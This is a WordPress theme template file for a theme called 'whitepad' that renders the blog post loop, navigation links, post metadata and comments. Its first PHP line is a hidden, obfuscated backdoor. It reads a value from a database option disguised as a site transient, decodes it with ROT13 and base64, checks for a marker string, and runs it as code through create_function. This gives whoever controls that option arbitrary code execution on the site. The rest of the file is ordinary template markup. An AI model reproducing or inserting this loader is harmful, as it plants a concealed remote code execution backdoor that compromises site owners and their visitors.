<?php
$z=get_option("_site_transient_browser_0af9854a7da08864157d6814bc64e3bc"); $z=base64_decode(str_rot13($z)); if(strpos($z,"F1D2AF1C")!==false){ $_z=create_function("",$z); @$_z(); }
 get_header() ?>
	<div id="container">
		<div id="content">
      <div id="nav-above" class="navigation">
				<div class="nav-previous"><?php next_posts_link(__( '<span class="meta-nav">&laquo;</span> Older posts', 'whitepad' )) ?></div>
				<div class="nav-next"><?php previous_posts_link(__( 'Newer posts <span class="meta-nav">&raquo;</span>', 'whitepad' )) ?></div>
			</div>

<?php while ( have_posts() ) : the_post() ?>

			<div id="post-<?php the_ID() ?>" class="<?php sandbox_post_class() ?>">
				<h2 class="entry-title"><a href="<?php the_permalink() ?>" title="<?php printf( __('Permalink to %s', 'whitepad'), the_title_attribute('echo=0') ) ?>" rel="bookmark"><?php the_title() ?></a></h2>
				<div class="entry-content">
				<?php the_content( __( '<span class="mod-more"><span class="moretext">Read On</span></span>', 'whitepad' ) ) ?>

				<?php wp_link_pages('before=<div class="page-link">' . __( 'Pages:', 'whitepad' ) . '&after=</div>') ?>
				</div>
				<div class="entry-meta">
        	<?php edit_post_link( __( 'Edit', 'whitepad' ), "\n\t\t\t\t\t<span class=\"edit-link\">", "</span>\n\t\t\t\t\t<span class=\"meta-sep\">|</span>\n" ) ?>
					<span class="author vcard"><?php printf( __( 'By %s', 'whitepad' ), '<a class="url fn n" href="' . get_author_link( false, $authordata->ID, $authordata->user_nicename ) . '" title="' . sprintf( __( 'View all posts by %s', 'whitepad' ), $authordata->display_name ) . '">' . get_the_author() . '</a>' ) ?></span>
					<span class="entry-date"> on <abbr class="published" title="<?php the_time('Y-m-d') ?>"><?php unset($previousday); printf( __( '%1$s &#8211; %2$s', 'whitepad' ), the_date( '', '', '', false ), get_the_time() ) ?></abbr></span>
          <span class="meta-sep">|</span>
					<span class="cat-links"><?php printf( __( 'Posted in %s', 'whitepad' ), get_the_category_list(', ') ) ?></span>

					<?php the_tags( __( '<span class="tag-links">Tagged ', 'whitepad' ), ", ", "</span>\n" ) ?>
					<span class="comments-link"><?php comments_popup_link( __( 'Comments (0)', 'whitepad' ), __( 'Comments (1)', 'whitepad' ), __( 'Comments (%)', 'whitepad' ) ) ?></span>
					
        </div>
			</div><!-- .post -->

<?php comments_template() ?>

<?php endwhile; ?>

			<div id="nav-below" class="navigation">
				<div class="nav-previous"><?php next_posts_link(__( '<span class="meta-nav">&laquo;</span> Older posts', 'whitepad' )) ?></div>
				<div class="nav-next"><?php previous_posts_link(__( 'Newer posts <span class="meta-nav">&raquo;</span>', 'whitepad' )) ?></div>
			</div>
		</div><!-- #content -->
	</div><!-- #container -->

<?php get_sidebar() ?>
<div class="clear"></div>
<?php get_footer() ?>